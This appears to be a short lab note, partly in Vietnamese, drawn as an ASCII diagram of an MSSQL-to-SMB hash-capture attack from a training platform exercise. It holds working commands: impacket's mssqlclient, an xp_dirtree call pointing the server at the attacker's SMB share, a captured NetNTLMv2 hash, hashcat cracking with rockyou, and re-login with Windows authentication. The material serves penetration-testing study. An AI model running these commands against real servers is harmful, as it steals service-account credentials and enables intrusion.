...
==============================================================
             ...
             -------------------                     -----------------------
                       ...
                       |                                       |   ( ta lấy IP ở cổng tun0 hiện tại là 10.10.14.255 )
                       |                                       |
                       |<--------------------------------------|
                       | 2. Attacker sends SQL command         |sudo python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py htbdbuser@10.129.203.12
                       |    remotely to MSSQL:                 |  Dùng lệnh help để show các chức năng 
                       |                                       |  EXEC master..xp_dirtree '\\10.10.14.255\share\';  để mở 
                       ...
                       |                                       |
                       |-------------------------------------->|
                       | 3. MSSQL tries to access SMB share     |Lấy mã hash dạng mssqlsvc::ACADEMY-ATTCOMSVC-WIN-02:5e3ab1c...:a1883063...:01010000...
                       |    to list directories                 |  Lưu vào file hash.txt để giải mã 
                       |                                       |   hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
                       |                                       |    -> Pass tìm được là pass ở local nên không thể dùng bằng cách thông thường để login 
                       |-------------------------------------->|    -> login bằng windows authen : sudo python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py  MSSQLSVC@10.129.109.98  -windows-auth
